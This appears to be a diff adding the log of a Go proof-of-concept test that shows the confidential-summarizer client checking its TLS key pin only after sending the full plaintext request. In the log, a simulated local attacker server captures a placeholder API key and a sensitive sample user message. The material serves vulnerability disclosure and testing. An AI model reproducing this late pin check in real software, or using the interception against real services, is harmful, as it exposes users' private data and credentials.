@@ -1,0 +1,22 @@
+=== RUN   TestPoCSummarizerPostSendPinLeak
+    poc_postsend_pin_test.go:178: attested (pinned) router TLS key FP : 540427ed891c19b6ec5d7f81124af5f8d54ad16ae882baaa2e538f650d1e4fc8
+    poc_postsend_pin_test.go:179: attacker cert key FP                : a4e375c501412646bd5d408b06ef54485403762591a52e6aa20e56335d60f26a
+    poc_postsend_pin_test.go:192: client enclave=router.inf6.tinfoil.sh  (base URL https://router.inf6.tinfoil.sh/v1/)
+    poc_postsend_pin_test.go:203: [control] summarizer -> 200 {"summary":"genuine router title"}
+    poc_postsend_pin_test.go:214: [attack] summarizer -> 503 {"error":"upstream service is temporarily unavailable","code":"upstream_unavailable","request_id":"8e6db273-5ae2-4f2d-aa6a-0474a1cefadb"}
+    poc_postsend_pin_test.go:218: [attack] attacker saw 1 request(s): HTTP/2.0 /v1/chat/completions
+    poc_postsend_pin_test.go:219: [attack] attacker saw Authorization: "Bearer tk_SUMMARIZER_SERVICE_SECRET_API_KEY"
+    poc_postsend_pin_test.go:220: [attack] attacker saw body: {"messages":[{"content":"Generate a concise, descriptive title for the following text. ONLY output plain text - never output markdown or code. Use between 2 and 5 words.","role":"system"},{"content":"I was diagnosed with HIV yesterday; how do I tell my employer without losing my job?","role":"user"}],"model":"llama3-3-70b","max_completion_tokens":1024,"reasoning_effort":"low"}
+    poc_postsend_pin_test.go:221: [attack] attacker had plaintext 2.485ms after request start; summarizer returned error 2.895ms after start
+    poc_postsend_pin_test.go:226: [net] 18:27:30.981904 HTTP request to router.inf6.tinfoil.sh/v1/chat/completions (proxy=<nil>)
+    poc_postsend_pin_test.go:226: [net] 18:27:30.982013 dial router.inf6.tinfoil.sh:443 -> routed to local listener 127.0.0.1:40027
+    poc_postsend_pin_test.go:226: [net] 18:27:30.986178 genuine server received POST /v1/chat/completions (325 body bytes)
+    poc_postsend_pin_test.go:226: [net] 18:27:30.987261 HTTP request to router.inf6.tinfoil.sh/v1/chat/completions (proxy=<nil>)
+    poc_postsend_pin_test.go:226: [net] 18:27:30.987352 dial router.inf6.tinfoil.sh:443 -> routed to local listener 127.0.0.1:37327
+    poc_postsend_pin_test.go:226: [net] 18:27:30.989557 attacker server received POST /v1/chat/completions (379 body bytes)
+    poc_postsend_pin_test.go:226: [net] 18:27:30.989824 HTTP request to api-github-proxy.tinfoil.sh/repos/tinfoilsh/confidential-model-router/releases/latest (proxy=http://127.0.0.1:9)
+    poc_postsend_pin_test.go:226: [net] 18:27:30.989850 dial 127.0.0.1:9 -> BLOCKED (no external traffic)
+    poc_postsend_pin_test.go:239: RESULT: pin mismatch detected only AFTER the full plaintext request (user content + API key) reached the non-attested peer
+--- PASS: TestPoCSummarizerPostSendPinLeak (0.01s)
+PASS
+ok  	github.com/tinfoilsh/confidential-summarizer	0.023s
